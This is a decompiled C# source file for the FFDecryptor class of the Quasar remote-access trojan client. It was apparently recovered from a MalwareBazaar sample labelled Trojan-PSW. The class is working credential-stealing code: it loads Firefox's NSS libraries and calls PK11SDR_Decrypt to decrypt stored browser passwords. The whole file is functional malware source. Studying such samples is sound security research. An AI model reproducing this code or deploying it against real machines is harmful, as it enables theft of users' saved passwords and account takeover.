// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Recovery.Browsers.FFDecryptor
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Quasar.Client.Recovery.Browsers
{
  public class FFDecryptor : IDisposable
  {
    private FFDecryptor.NssInit NSS_Init;
    private FFDecryptor.NssShutdown NSS_Shutdown;
    private FFDecryptor.Pk11sdrDecrypt PK11SDR_Decrypt;
    private IntPtr NSS3;
    private IntPtr Mozglue;

    public long Init(string configDirectory)
    {
      string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Mozilla Firefox\\");
      this.Mozglue = Quasar.Client.Utilities.NativeMethods.LoadLibrary(Path.Combine(path1, "mozglue.dll"));
      this.NSS3 = Quasar.Client.Utilities.NativeMethods.LoadLibrary(Path.Combine(path1, "nss3.dll"));
      IntPtr procAddress1 = Quasar.Client.Utilities.NativeMethods.GetProcAddress(this.NSS3, "NSS_Init");
      IntPtr procAddress2 = Quasar.Client.Utilities.NativeMethods.GetProcAddress(this.NSS3, "NSS_Shutdown");
      IntPtr procAddress3 = Quasar.Client.Utilities.NativeMethods.GetProcAddress(this.NSS3, "PK11SDR_Decrypt");
      this.NSS_Init = (FFDecryptor.NssInit) Marshal.GetDelegateForFunctionPointer(procAddress1, typeof (FFDecryptor.NssInit));
      this.PK11SDR_Decrypt = (FFDecryptor.Pk11sdrDecrypt) Marshal.GetDelegateForFunctionPointer(procAddress3, typeof (FFDecryptor.Pk11sdrDecrypt));
      this.NSS_Shutdown = (FFDecryptor.NssShutdown) Marshal.GetDelegateForFunctionPointer(procAddress2, typeof (FFDecryptor.NssShutdown));
      return this.NSS_Init(configDirectory);
    }

    public string Decrypt(string cypherText)
    {
      IntPtr num = IntPtr.Zero;
      StringBuilder stringBuilder = new StringBuilder(cypherText);
      try
      {
        byte[] source = Convert.FromBase64String(cypherText);
        num = Marshal.AllocHGlobal(source.Length);
        Marshal.Copy(source, 0, num, source.Length);
        FFDecryptor.TSECItem result = new FFDecryptor.TSECItem();
        if (this.PK11SDR_Decrypt(ref new FFDecryptor.TSECItem()
        {
          SECItemType = 0,
          SECItemData = num,
          SECItemLen = source.Length
        }, ref result, 0) == 0)
        {
          if (result.SECItemLen != 0)
          {
            byte[] numArray = new byte[result.SECItemLen];
            Marshal.Copy(result.SECItemData, numArray, 0, result.SECItemLen);
            return Encoding.ASCII.GetString(numArray);
          }
        }
      }
      catch (Exception ex)
      {
        return (string) null;
      }
      finally
      {
        if (num != IntPtr.Zero)
          Marshal.FreeHGlobal(num);
      }
      return (string) null;
    }

    public void Dispose()
    {
      this.Dispose(true);
      GC.SuppressFinalize((object) this);
    }

    protected virtual void Dispose(bool disposing)
    {
      if (!disposing)
        return;
      long num = this.NSS_Shutdown();
      Quasar.Client.Utilities.NativeMethods.FreeLibrary(this.NSS3);
      Quasar.Client.Utilities.NativeMethods.FreeLibrary(this.Mozglue);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long NssInit(string configDirectory);

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate long NssShutdown();

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int Pk11sdrDecrypt(
      ref FFDecryptor.TSECItem data,
      ref FFDecryptor.TSECItem result,
      int cx);

    public struct TSECItem
    {
      public int SECItemType;
      public IntPtr SECItemData;
      public int SECItemLen;
    }
  }
}
